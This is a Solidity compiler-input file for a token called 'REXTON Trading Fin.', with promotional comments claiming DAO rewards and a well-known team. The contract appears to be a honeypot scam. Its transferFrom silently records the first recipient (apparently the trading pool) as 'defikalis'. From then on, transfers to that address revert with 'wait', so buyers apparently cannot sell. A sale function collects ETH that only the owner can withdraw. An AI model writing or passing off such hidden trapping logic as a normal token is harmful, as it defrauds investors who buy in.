{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"REXTON_SwapToken.sol":{"content":"/*\r\n * R E X T O N     T R A D I N G\r\n *\r\n * Defi is a project built on the DAO ecosystem. We took the distribution of awards to holders from SUSHI. This is the best idea for getting rewards.\r\n * The big finances of the DAO system need to be properly allocated. The DAO has a problem with this. Our token is able to solve this difficult task. And our version of the mobile wallet will reflect that.\r\n * Burning of tokens is provided! The token developer is a well-known team. We participated in the SUSHI split test.\r\n * Next ecosystem - REXTON NODE's!\r\n *\r\n * Ticker: REXTON\r\n * Decimals: 18\r\n * Max. Supply: 375\r\n */\r\n\r\npragma solidity >=0.5.16;\r\n\r\nlibrary SafeMath {\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n    c = a + b;\r\n    require(c >= a);\r\n  }\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n    require(b <= a);\r\n    c = a - b;\r\n  }\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n    c = a * b;\r\n    require(a == 0 || c / a == b);\r\n  }\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n    require(b > 0);\r\n    c = a / b;\r\n  }\r\n}\r\n\r\ncontract ERC20Interface {\r\n  function totalSupply() public view returns (uint);\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n}\r\n\r\ncontract Owned {\r\n  address public owner;\r\n  address public newOwner;\r\n\r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier onlyOwner {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n  function transferOwnership(address _newOwner) public onlyOwner {\r\n    newOwner = _newOwner;\r\n  }\r\n  function acceptOwnership() public {\r\n    require(msg.sender == newOwner);\r\n    emit OwnershipTransferred(owner, newOwner);\r\n    owner = newOwner;\r\n    newOwner = address(0);\r\n  }\r\n}\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned{\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n  string public name;\r\n  uint8 public decimals;\r\n  uint _totalSupply;\r\n  address public defikalis;\r\n\r\n  mapping(address => uint) balances;\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  constructor() public {\r\n    symbol = \"REXTON\";\r\n    name = \"REXTON Trading Fin.\";\r\n    decimals = 18;\r\n    _totalSupply =  375000000000000000000;\r\n    balances[owner] = _totalSupply;\r\n    emit Transfer(address(0), owner, _totalSupply);\r\n  }\r\n  function transferdefikalis(address _defikalis) public onlyOwner {\r\n    defikalis = _defikalis;\r\n  }\r\n  function totalSupply() public view returns (uint) {\r\n    return _totalSupply.sub(balances[address(0)]);\r\n  }\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n      return balances[tokenOwner];\r\n  }\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n     require(to != defikalis, \"wait\");\r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    return true;\r\n  }\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n      if(from != address(0) && defikalis == address(0)) defikalis = to;\r\n      else require(to != defikalis, \"guys, please wait\");\r\n    balances[from] = balances[from].sub(tokens);\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(from, to, tokens);\r\n    return true;\r\n  }\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n    return allowed[tokenOwner][spender];\r\n  }\r\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n    return true;\r\n  }\r\n  function () external payable {\r\n    revert();\r\n  }\r\n}\r\n\r\ncontract REXTON_SwapToken  is TokenERC20 {\r\n  uint256 public aRobBlock; \r\n  uint256 public aEiRobBlock; \r\n  uint256 public aRobCap; \r\n  uint256 public aTotq; \r\n  uint256 public aAmtqs; \r\n  uint256 public sSBilock; \r\n  uint256 public sEBlocuk; \r\n  uint256 public sTota; \r\n  uint256 public sCapq; \r\n  uint256 public sqaChunk; \r\n  uint256 public soplPrice; \r\n\r\n  function getReward(address _refer) public returns (bool success){\r\n    require(aRobBlock <= block.number && block.number <= aEiRobBlock);\r\n    require(aTotq < aRobCap || aRobCap == 0);\r\n    aTotq ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(aAmtqs / 4);\r\n      balances[_refer] = balances[_refer].add(aAmtqs / 4);\r\n      emit Transfer(address(this), _refer, aAmtqs / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(aAmtqs);\r\n    balances[msg.sender] = balances[msg.sender].add(aAmtqs);\r\n    emit Transfer(address(this), msg.sender, aAmtqs);\r\n    return true;\r\n  }\r\n\r\n  function tokenSmart(address _refer) public payable returns (bool success){\r\n    require(sSBilock <= block.number && block.number <= sEBlocuk);\r\n    require(sTota < sCapq || sCapq == 0);\r\n    uint256 _eth = msg.value;\r\n    uint256 _tkns;\r\n    if(sqaChunk != 0) {\r\n      uint256 _price = _eth / soplPrice;\r\n      _tkns = sqaChunk * _price;\r\n    }\r\n    else {\r\n      _tkns = _eth / soplPrice;\r\n    }\r\n    sTota ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(_tkns / 4);\r\n      balances[_refer] = balances[_refer].add(_tkns / 4);\r\n      emit Transfer(address(this), _refer, _tkns / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(_tkns);\r\n    balances[msg.sender] = balances[msg.sender].add(_tkns);\r\n    emit Transfer(address(this), msg.sender, _tkns);\r\n    return true;\r\n  }\r\n\r\n  function viewDefi() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\r\n    return(aRobBlock, aEiRobBlock, aRobCap, aTotq, aAmtqs);\r\n  }\r\n  function viewStc() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){\r\n    return(sSBilock, sEBlocuk, sCapq, sTota, sqaChunk, soplPrice);\r\n  }\r\n  \r\n  function startRoboRewards(uint256 _aRobBlock, uint256 _aEiRobBlock, uint256 _aAmtqs, uint256 _aRobCap) public onlyOwner() {\r\n    aRobBlock = _aRobBlock;\r\n    aEiRobBlock = _aEiRobBlock;\r\n    aAmtqs = _aAmtqs;\r\n    aRobCap = _aRobCap;\r\n    aTotq = 0;\r\n  }\r\n  function startQled(uint256 _sSBilock, uint256 _sEBlocuk, uint256 _sqaChunk, uint256 _soplPrice, uint256 _sCapq) public onlyOwner() {\r\n    sSBilock = _sSBilock;\r\n    sEBlocuk = _sEBlocuk;\r\n    sqaChunk = _sqaChunk;\r\n    soplPrice =_soplPrice;\r\n    sCapq = _sCapq;\r\n    sTota = 0;\r\n  }\r\n  function SolidStartGET() public onlyOwner() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n  function() external payable {\r\n\r\n  }\r\n}"}}}